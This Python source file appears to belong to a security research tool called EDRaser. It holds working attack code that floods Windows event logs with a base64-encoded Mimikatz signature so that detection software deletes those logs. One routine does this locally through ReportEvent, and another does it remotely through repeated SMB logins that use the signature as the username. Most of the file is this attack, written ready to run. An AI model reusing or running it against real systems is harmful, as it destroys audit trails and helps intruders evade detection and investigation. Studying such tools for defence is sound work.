from typing import List
import win32api
import winerror
import pywintypes
import win32evtlog
import logging
import platform
import base64
from signatures import Signature

SUPPORTED_EVENT_TYPES = [
    win32evtlog.EVENTLOG_SUCCESS,
    win32evtlog.EVENTLOG_AUDIT_FAILURE,
    win32evtlog.EVENTLOG_AUDIT_SUCCESS,
    win32evtlog.EVENTLOG_ERROR_TYPE,
    win32evtlog.EVENTLOG_INFORMATION_TYPE,
    win32evtlog.EVENTLOG_WARNING_TYPE,
]

DEFAULT_LOG_INSERTION = 20000
INVOKE_MIMIKATZ_STR = base64.b64decode("QWRkLU1lbWJlciBOb3RlUHJvcGVydHkgLU5hbWUgVmlydHVhbFByb3RlY3QgLVZhbHVlICRWaXJ0dWFsUHJvdGVjdA==").decode()

def report_event_to_event_log(log_name: str,
                              event_type: int,
                              event_category: int,
                              event_id: int,
                              sid: pywintypes.SIDType = None,
                              event_description: List[str] = None,
                              data: str = None) -> None:
    """
    Reports an event to an event log
    Wrapper around WinApi ReportEvent - https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-reporteventa
    
    :param log_name: The name of the event log to report the event to
    :param event_type: The type of event to be logged
    :param event_category: The event category, this is source specific value, and this value can potentially have any value
    :param event_id: The event ID
    :param sid: The current user's SID
    :param event_description: The description of the event to be reported to the event log
    :param data: Binary data to include in the event
    
    .. note: If an unknown log name is used, Windows will automatically use the `Application` event log and the log_name will be rendered as source name of the logged event
    """
    if event_type not in SUPPORTED_EVENT_TYPES:
        raise TypeError(f"Event type {event_type} is not supported. Supported event types: {SUPPORTED_EVENT_TYPES}")
    
    log_handle = win32evtlog.OpenEventLog(None, log_name)

    win32evtlog.ReportEvent(
        log_handle,
        event_type,
        event_category,
        event_id,
        sid,
        event_description,
        data)
        
    if win32api.GetLastError() == winerror.ERROR_ENVVAR_NOT_FOUND:
        logging.debug("Log name was not found, used `Application` log as fallback")


def run_local_application_event_log_attack(log_insertions: int = DEFAULT_LOG_INSERTION) -> dict:
    """
    Deletes the `Application` event log by reporting events containing malicious signatures

    :param log_insertions: The amount of logs to insert to the `Application` event log
    :return: Returns the SafeBreach state object
    """
    if platform.system() != "Windows":
        logging.error("Local Application Event Log Attack can run on windows machines only")
        return
    
    logging.info("Running Local Security Event Log Deletion")
    
    try:
        for _ in range(0, log_insertions):
            report_event_to_event_log(
                "SafeBreach EDRaser", win32evtlog.EVENTLOG_SUCCESS, 0, 1, event_description=[INVOKE_MIMIKATZ_STR,INVOKE_MIMIKATZ_STR])

    except Exception as e:
        logging.error(f"Error {e}")


def run_remote_security_event_log_deletion(signatureDB: List[Signature], server_ip: str, port: int = 445, log_insertions: int = 20000) -> dict:
    """
    Remotely deletes the `Security` event log by authenticating with a malicious username over SMB
    Each login attempt gets reported to the `Security` event log and the malicious signature is rendered in the username field

    :param server_ip: IP of the server we want to remotely delete its `Security` event log
    :param port: The port of the SMB server running on the target machine, default is 445
    :param log_insertions: The amount of logs to insert to the `Security` event log

    """    
    from impacket.smbconnection import SessionError, SMBConnection
    logging.info("Running Remote Security Event Log Deletion")

    try:
        smb_client = SMBConnection("EDRaser", remoteHost= server_ip, sess_port=port)
    except Exception as e:
        logging.error("Failed to create connection to remote machine via SMB")
        return

    logging.info("Successfully connected to remote machine via SMB")
    for _ in range(log_insertions):
            try:
                smb_client.login(INVOKE_MIMIKATZ_STR, "NotMtter")
            # SessionError is expected to be raised as we use invalid credentials 
            except SessionError:
                pass
            except Exception as e:
                logging.error(f"LOG_INSERTIONS {log_insertions} ERROR {str(e)}")
                raise

    
